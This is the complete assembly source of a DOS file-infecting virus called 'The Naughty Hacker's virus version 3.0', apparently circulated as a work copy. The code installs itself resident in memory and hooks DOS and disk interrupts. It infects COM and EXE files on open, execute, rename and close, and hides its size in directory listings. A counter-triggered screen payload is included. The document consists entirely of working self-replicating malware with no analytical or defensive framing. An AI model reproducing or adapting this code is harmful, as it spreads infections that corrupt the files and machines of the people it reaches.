	.radix	16

	;WARNING: THIS IS NOT A BASIC RELEASE BUT A WORK COPY!
	;It seems that somebody had steal this version and
	;circulates it now.

	title	The Naughty Hacker's virus version 3.0
	comment / Naughty Hacker wishes you the best ! /

	jmp	start

	virlen	equ	offset endcode-offset begin
	alllen	equ	offset buffer-offset begin

begin   label word

	IP_save dw	20cdh
	CS_save dw	?
	SS_save dw	?
	far_push dw	?
	ident	db	'C'
start:
	call	inf
inf:
	pop	bp
	sub	bp,offset start-offset begin+3
	push	es
	push	ds
	mov	es,es:[2]
	mov	di,start-begin
	push	ds
	push	cs
	pop	ds
	mov	si,di
	add	si,bp
	mov	cx,endcode-inf
	cld
	rep	cmpsb
	pop	ds
	push	ds
	pop	es
	je	run
ina:
	cmp	word ptr [0],20cdh
	je	urud
	jmp	run
urud:
	mov	word ptr cs:[bp+handle-begin],0ffff
	mov	word ptr cs:[bp+counter-begin],2345
	mov	ax,ds
	dec	ax
	mov	ds,ax
	sub	word ptr [3],80
	mov	ax,es:[2]
	sub	ax,80
	mov	es:[2],ax
	push	ax

	sub	di,di
	mov	si,bp
	mov	ds,di
	pop	es
	push	cs
	pop	ds
	mov	cx,alllen
	rep	movsb
	push	cs
	mov	ax,offset run-begin
	add	ax,bp
	push	ax
	push	es
	mov	ax,offset inss-100-3
	push	ax
	retf
run:
	pop	ds
	pop	es
	cmp	byte ptr cs:[bp+ident-begin],'C'
	je	comfile
	mov	dx,cs:[bp+CS_save-begin]
	mov	cx,cs
	sub	cx,word ptr cs:[bp+far_push-begin]
	add	dx,cx
	add	cx,cs:[bp+SS_save-begin]
	cli
	mov	ss,cx
	sti
clear:
	push	dx
	push	word ptr cs:[bp+IP_save-begin]
	call	clearr
	retf
comfile:
	mov	ax,cs:[bp+IP_save-begin]
	mov	[100],ax
	mov	ax,cs:[bp+CS_save-begin]
	mov	[102],ax
	mov	ax,100
	push	ax
	call	clearr
	retn
cur:
	call	exec
	push	bx
	push	es
	push	si
	push	ax
	mov	si,dx
	cmp	byte ptr [si],0ff
	jne	puf
	mov	ah,2f
	call	exec

	mov	al,byte ptr es:[bx+22d+7+1]
	and	al,31d
	cmp	al,31d
	jnz	puf
	cmp	word ptr es:[bx+28d+2+7+1],0
	jne	scs
	cmp	word ptr es:[bx+28d+7+1],virlen*2
	jb	puf
scs:
	sub	word ptr es:[bx+28d+7+1],virlen
	sbb	word ptr es:[bx+28d+2+7+1],0
puf:
	pop	ax
	pop	si
	pop	es
	pop	bx
	iret

inff:
	dec	word ptr cs:[counter-begin]
	jnz	neass
	call	shop
neass:
	cmp	ah,11
	je	cur
	cmp	ah,12
	je	cur

	cmp	ah,4e
	jne	cur1.1
	jmp	cur1
cur1.1:
	cmp	ah,4f
	jne	cur1.2
	jmp	cur1
cur1.2:
	cmp	ah,3ch
	je	create
	cmp	ah,5bh
	je	create

	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	bp
	push	ds
	push	es

	mov	byte ptr cs:[function-begin],ah

	cmp	ah,3dh
	je	open

	cmp	ah,3e
	je	close_

	cmp	ax,4b00
	je	execute

	cmp	ah,17
	je	ren_FCB

	cmp	ah,56
	je	execute

	cmp	ah,43
	je	execute

here:
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	dword ptr cs:[current_21h-begin]

ren_FCB:
	call	transfer
	call	coont
	jmp	here

create:
	call	exec
	mov	word ptr cs:[handle-begin],ax
	db	0ca,2,0
close_:
	cmp	word ptr cs:[handle-begin],0ffff
	je	here
	cmp	bx,word ptr cs:[handle-begin]
	jne	here
	mov	ah,45
	call	coont
	mov	word ptr cs:[handle-begin],0ffff
	jmp	here
execute:
	mov	ah,3dh
	call	coont
	jmp	here
open:
	call	coont
	jmp	here
cur1:
	call	exec
	pushf
	push	ax
	push	bx
	push	es

	mov	ah,2f
	call	exec

	mov	al,es:[bx+22d]
	and	al,31d
	cmp	al,31d
	jne	puf1

	cmp	es:[bx+28d],0
	jne	scs1
	cmp	es:[bx+26d],virlen*2
	jb	puf1
scs1:
	sub	es:[bx+26d],virlen
	sbb	es:[bx+28d],0
puf1:
	pop	es
	pop	bx
	pop	ax
	popf
	db	0ca,2,0 ;retf 2
coont:
	call	exec
	jnc	ner
	ret
ner:
	mov	bp,ax
	mov	byte ptr cs:[flag-begin],0
	mov	ah,54
	call	exec
	mov	byte ptr cs:[veri-begin],al
	cmp	al,1
	jne	rty
	mov	ax,2e00
	call	exec
rty:
	mov	ax,3508
	call	exec
	mov	word ptr cs:[current_08h-begin],bx
	mov	word ptr cs:[current_08h-begin+2],es
	push	bx
	push	es
	mov	al,21
	call	exec
	push	bx
	push	es
	mov	al,24
	call	exec
	push	bx
	push	es
	mov	al,13
	call	exec
	push	bx
	push	es
	mov	ah,25
	mov	dx,int13h-begin
	push	cs
	pop	ds
	call	exec
	mov	al,21
	lds	dx,cs:[org_21h-begin]
	call	exec
	mov	al,24
	push	cs
	pop	ds
	mov	dx,int24h-begin
	int	21
	mov	al,8
	mov	dx,int08h-begin
	int	21
	mov	bx,bp
	push	bx
	mov	ax,1220
	call	exec2f
	mov	bl,es:[di]
	mov	ax,1216
	call	exec2f
	pop	bx
	add	di,11
	mov	byte ptr es:[di-15d],2
	mov	ax,es:[di]
	mov	dx,es:[di+2]
	cmp	dx,0
	jne	contss
	cmp	ax,virlen
	jnb	contss
	jmp	close
contss:
	cmp	byte ptr cs:[function-begin],3dh
	jne	hhh
	push	di
	add	di,0f
	mov	si,offset fname-begin
	cld
	mov	cx,8+3
	rep	cmpsb
	pop	di
	jne	hhh
	jmp	close
hhh:
	cmp	es:[di+18],'MO'
	jne	a2
	jmp	com
a2:
	cmp	es:[di+18],'EX'
	je	a8
	jmp	close
a8:
	cmp	byte ptr es:[di+17],'E'
	je	a3
	jmp	close
a3:
	call	cont
	cmp	word ptr [si],'ZM'
	je	okk
	cmp	word ptr [si],'MZ'
	je	okk
	jmp	close
 okk:
	cmp	word ptr [si+0c],0
	jne	uuu
	jmp	close
uuu:
	mov	cx,[si+16]
	add	cx,[si+8]
	mov	ax,10
	mul	cx
	add	ax,[si+14]
	adc	dx,0
	mov	cx,es:[di+2]
	sub	cx,dx
	or	cx,cx
	jnz	usm
	mov	cx,es:[di]
	sub	cx,ax
	cmp	cx,virlen-(start-begin)
	jne	usm
	jmp	close
usm:
	mov	byte ptr [ident-begin],'E'
	mov	ax,[si+0e]
	mov	[SS_save-begin],ax
	mov	ax,[si+14]
	mov	[IP_save-begin],ax
	mov	ax,[si+16]
	mov	[CS_save-begin],ax
	mov	ax,es:[di]
	mov	dx,es:[di+2]
	add	ax,virlen
	adc	dx,0
	mov	cx,200
	div	cx
	mov	[si+2],dx
	or	dx,dx
	jz	oj
	inc	ax
oj:
	mov	[si+4],ax
	mov	ax,es:[di]
	mov	dx,es:[di+2]

	mov	cx,4	;  This could be so:
	mov	bp,ax	;
	and	bp,0fh	;  mov  cx,10
lpp:			;  div  cx
	shr	dx,1	;
	rcr	ax,1	;
	loop	lpp	;
	mov	dx,bp	;

	sub	ax,[si+8]
	add	dx,start-begin
	adc	ax,0
	mov	[si+14],dx
	mov	[si+16],ax
	mov	word ptr [far_push-begin],ax
	add	ax,200
	mov	[si+0eh],ax
 write:
	sub	cx,cx
	mov	es:[di+4],cx
	mov	es:[di+6],cx
	push	es:[di-2]
	push	es:[di-4]
	xchg	cx,es:[di-0dh]
	push	cx
	mov	ah,40
	mov	dx,buffer-begin
	mov	cx,01bh
	int	21
	cmp	byte ptr cs:[flag-begin],0ff
	jne	ghj
	stc
	jc	exit
ghj:
	mov	ax,es:[di]
	mov	es:[di+4],ax
	mov	ax,es:[di+2]
	mov	es:[di+6],ax
	call	com?
	jne	f2
	sub	es:[di+4],virlen
	sbb	es:[di+6],0
f2:
	mov	ah,40
	sub	dx,dx
	mov	cx,virlen
	int	21
	cmp	byte ptr cs:[flag-begin],0ff
	jne	exit
	stc
 exit:
	pop	cx
	mov	es:[di-0dh],cx
	pop	cx
	pop	dx
	or	byte ptr es:[di-0bh],40
	jc	closed
	call	com?
	jne	f3
	and	cx,31d
	or	cx,2
	jmp	closed
f3:
	or	cx,31d
closed:
	mov	ax,5701
	int	21
close:
	mov	ah,3e
	int	21
	or	byte ptr es:[di-0ch],40

	push	es
	pop	ds
	mov	si,di
	add	si,0f
	mov	di,offset fname-begin
	push	cs
	pop	es
	mov	cx,8+3
	cld
	rep	movsb
	push	cs
	pop	ds

	cmp	byte ptr cs:[flag-begin],0ff
	jne	qw
	mov	ah,0dh
	int	21
qw:
	cmp	byte ptr cs:[veri-begin],1
	jne	rtyyu
	mov	ax,2e01
	call	exec
rtyyu:
	sub	ax,ax
	mov	ds,ax
	cli
	pop	[13*4+2]
	pop	[13*4]
	pop	[24*4+2]
	pop	[24*4]
	pop	[21*4+2]
	pop	[21*4]
	pop	[8*4+2]
	pop	[8*4]
	sti
	retn
 com:
	test	byte ptr es:[di-0dh],4
	jz	esc4
	jmp	close
esc4:
	call	cont
	cmp	byte ptr [si],0e9
	jne	usm2
	mov	ax,es:[di]
        sub     ax,[si+1]
	cmp	ax,virlen-(start-begin-3)
	jne	usm2
	jmp	close
usm2:
	push	si
	cmp	byte ptr es:[di+17],'C'
	jne	esc
	mov	byte ptr [ident-begin],'C'
	lodsw
	mov	cs:[IP_save-begin],ax
	lodsw
	mov	cs:[CS_save-begin],ax
	mov	ax,es:[di]
	cmp	ax,65535d-virlen-1
	pop	si
	jb	esc
	jmp	close
esc:
	add	ax,start-begin-3
	call	com?
	jne	f1
	sub	ax,virlen
f1:
	mov	byte ptr [si],0e9
	mov	word ptr [si+1],ax
	jmp	write
inss:

	sub	ax,ax
	mov	ds,ax

	pushf
	pop	ax
	and	ax,0feff
	push	ax
	popf

	pushf

	mov	[1*4],offset trap-begin
	mov	[1*4+2],cs

	pushf
	pop	ax
	or	ax,100
	push	ax
	popf

	mov	ax,0ffff
	call	dword ptr [21h*4]

	sub	ax,ax
	mov	ds,ax

	pushf
	pop	ax
	and	ax,0feff
	push	ax
	popf

	pushf

	mov	[1*4],offset trap2-begin
	mov	[1*4+2],cs

	pushf
	pop	ax
	or	ax,100
	push	ax
	popf

	mov	ax,0ffff
	call	dword ptr [2fh*4]

	sub	ax,ax
	mov	ds,ax

	pushf
	pop	ax
	and	ax,0feff
	push	ax
	popf

	pushf

	mov	[1*4],offset trap3-begin
	mov	[1*4+2],cs

	pushf
	pop	ax
	or	ax,100
	push	ax
	popf

	sub	ax,ax
	call	dword ptr [13h*4]

	sub	ax,ax
	mov	ds,ax

	les	ax,[21*4]
	mov	word ptr cs:[current_21h-begin],ax
	mov	word ptr cs:[current_21h-begin+2],es
	mov	[21*4],offset inff-begin
	mov	[21*4+2],cs
	retf

trap:
	push	bp
	mov	bp,sp
	push	bx
	cmp	[bp+4],300
	ja	exit2
	mov	bx,[bp+2]
	mov	word ptr cs:[org_21h-begin],bx
	mov	bx,[bp+4]
	mov	word ptr cs:[org_21h-begin+2],bx
	and	[bp+6],0feff
exit2:
	pop	bx
	pop	bp
	iret

trap2:
	push	bp
	mov	bp,sp
	push	bx
	cmp	[bp+4],100
	ja	exit3
	mov	bx,[bp+2]
	mov	word ptr cs:[org_2fh-begin],bx
	mov	bx,[bp+4]
	mov	word ptr cs:[org_2fh-begin+2],bx
	and	[bp+6],0feff
exit3:
	pop	bx
	pop	bp
	iret


trap3:
	push	bp
	mov	bp,sp
	push	bx
	cmp	[bp+4],0C800
	jb	exit4
	mov	bx,[bp+2]
	mov	word ptr cs:[org_13h-begin],bx
	mov	bx,[bp+4]
	mov	word ptr cs:[org_13h-begin+2],bx
	and	[bp+6],0feff
exit4:
	pop	bx
	pop	bp
	iret

exec:
	pushf
	call	dword ptr cs:[org_21h-begin]
	ret


exec2f:
	pushf
	call	dword ptr cs:[org_2fh-begin]
	ret
int08h:
	pushf
	call	dword ptr cs:[current_08h-begin]
	push	ax
	push	ds
	sub	ax,ax
	mov	ds,ax
	cli
	mov	[13*4],offset int13h-begin
	mov	[13*4+2],cs
	mov	[8*4],offset int08h-begin
	mov	[8*4+2],cs
	mov	ax,word ptr cs:[org_21h-begin]
	mov	[21*4],ax
	mov	ax,word ptr cs:[org_21h-begin+2]
	mov	[21*4+2],ax
	mov	[24*4],offset int24h-begin
	mov	[24*4+2],cs
	sti
	pop	ds
	pop	ax
	iret
int24h:
	mov	al,3
	iret
int13h:
	pushf
	call	dword ptr cs:[org_13h-begin]
	jnc	dfg
	mov	byte ptr cs:[flag-begin],0ff
dfg:
	clc
	db	0ca,02,0	;retf 2

cont:
	sub	ax,ax
	mov	es:[di+4],ax
	mov	es:[di+6],ax
	mov	ah,3f
	mov	cx,01bh
	mov	dx,offset buffer-begin
	mov	si,dx
	int	21
	cmp	byte ptr cs:[flag-begin],0ff
	jne	a1
	stc
	pop	ax
	jmp	close
a1:
        ret
com?:
	cmp	es:[di+0f],'OC'
	jne	zz
	cmp	es:[di+11],'MM'
	jne	zz
	cmp	es:[di+13],'NA'
	jne	zz
	cmp	es:[di+15],' D'
	jne	zz
	cmp	es:[di+17],'OC'
	jne	zz
	cmp	byte ptr es:[di+19],'M'
zz:
	ret
transfer:

	cld
	inc	dx
	mov	si,dx
	mov	di,offset buffer-begin
	push	di
	push	cs
	pop	es
	mov	cx,8
	rep	movsb
	mov	al,'.'
	stosb
	mov	cx,3
	rep	movsb
	mov	al,0
	stosb
	pop	dx
	push	cs
	pop	ds
	mov	ax,3d00
	ret
e1:
	cli
	push ax
	push	di
	push	es
	mov	ax,0b800
	mov	es,ax
	mov	ax,word ptr cs:[pos-begin]
	push	ax
	call	comp
	mov	ax,word ptr cs:[strg-begin]
	stosw
	pop	ax

	or	ah,ah
	jz	s3

	cmp	ah,24d
	jb	s1
s3:
	neg	byte ptr cs:[y-begin]
s1:
	or	al,al
	jz	s4

	cmp	al,79d
	jb	s2
s4:
	neg	byte ptr cs:[x-begin]
s2:
        mov     ah,byte ptr cs:[y-begin]
	mov	al,byte ptr cs:[x-begin]
	add	byte ptr cs:[pos+1-begin],ah
	add	byte ptr cs:[pos-begin],al
	mov	ax,word ptr cs:[pos-begin]
	call	comp
	mov	ax,es:[di]
	mov	word ptr cs:[strg-begin],ax
	mov	es:[di],0f07
	pop	es
	pop	di
	pop	ax
	sti
	iret
comp:
	push	ax
	push	bx
	sub	bh,bh
	mov	bl,al
	mov	al,160d
	mul	ah
	add	ax,bx
	add	ax,bx
	mov	di,ax
	pop	bx
	pop	ax
	ret
shop:
	push	ax
	push	ds
	mov	byte ptr cs:[x-begin],0ff
	mov	byte ptr cs:[y-begin],0ff
	mov	word ptr cs:[pos-begin],1013
	mov	ax,0003
	int	10
	sub	ax,ax
	mov	ds,ax
	cli
	mov	[1c*4],offset e1-begin
	mov	[1c*4+2],cs
	sti
	pop	ds
	pop	ax
	ret
clearr:
	sub	ax,ax
	sub	bx,bx
	sub	cx,cx
	sub	dx,dx
	sub	si,si
	sub	di,di
	sub	bp,bp
	ret

db	666d	;Foolish ?!! -> dw 666d

db	55,0AA

endcode label	word

	current_21h	dd ?
	current_08h	dd ?
	org_2fh dd	?
	org_13h dd	?
	org_21h dd	?
	flag	db	?
	veri	db	?
	handle	dw	0ffff
	fname	db	8+3 dup (?)
	function db	?
	pos	dw	?
	x	db	?
	y	db	?
	strg	dw	?
	counter dw	?

buffer	label word